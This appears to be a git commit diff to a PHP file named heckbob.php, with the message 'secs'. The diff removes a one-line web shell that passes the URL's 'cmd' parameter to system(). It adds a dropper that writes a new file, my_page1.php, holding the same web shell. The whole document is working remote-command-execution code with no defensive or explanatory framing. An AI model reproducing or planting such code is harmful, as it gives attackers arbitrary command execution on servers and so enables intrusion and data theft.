7c3569d9453204670a4796c4874f87e7f71401ab
oodusany <odus.kemi@gmail.com>
2018-03-18 14:52:36 -0400

    secs

--- heckbob.php
+++ heckbob.php
@@ -1,1 +1,13 @@
-<?php system($_GET['cmd']); ?>
+<?php 
+
+$pagename = 'my_page1';
+
+$newFileName = './'.$pagename.".php";
+$newFileContent = "<?php echo 'here we are'; system($_GET['cmd']);?>";
+
+if (file_put_contents($newFileName, $newFileContent) !== false) {
+    echo "File created (" . basename($newFileName) . ")";
+} else {
+    echo "Cannot create file (" . basename($newFileName) . ")";
+}
+?>
